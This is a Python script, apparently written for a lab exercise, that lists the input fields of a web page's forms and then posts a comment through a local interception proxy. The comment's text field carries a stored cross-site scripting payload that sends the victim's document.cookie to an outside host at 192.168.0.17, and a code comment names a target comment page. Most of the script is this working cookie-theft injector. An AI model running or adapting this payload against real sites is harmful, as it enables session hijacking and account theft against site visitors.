from bs4 import BeautifulSoup
from requests_html import HTMLSession
from urllib.parse import urljoin
import sys

def get_all_forms(url):
	session = HTMLSession()
	res = session.get(url)
	soup = BeautifulSoup(res.html.html, "html.parser")
	# Almost a nice version of regex
	return soup.find_all("form")

def get_form_details(form):
	"""Returns the HTML details of a form"""
	# Get the form action 
	action = form.attrs.get("action").lower()
	# Get the methods?
	method = form.attrs.get("method", "get")
	inputs = []
	for input_tag in form.find_all("input"):
		input_type = input_tag.attrs.get("type", "text")
		input_name = input_tag.attrs.get("name")
		inputs.append(input_name)
	
	return inputs

session = HTMLSession()
url = sys.argv[1]
forms = get_all_forms(url)

for form in forms:
	form_details = get_form_details(form)

for i in range(len(form_details)):
	print(form_details[i])

proxy = {
	'http': 'http://127.0.0.1:8080'
}

data = {
	'title': 'something',
	'author': 'yesy',
	'text': '<script>document.write(\'<img src="http://192.168.0.17/?\'+document.cookie+\'"/>\');</script>',
	'submit': 'submit'
}
# target url: http://192.168.0.68/post_comment.php?id=2
res = session.post(url, data=data, proxies=proxy, verify=False)
print(res)

print(res.cookies)
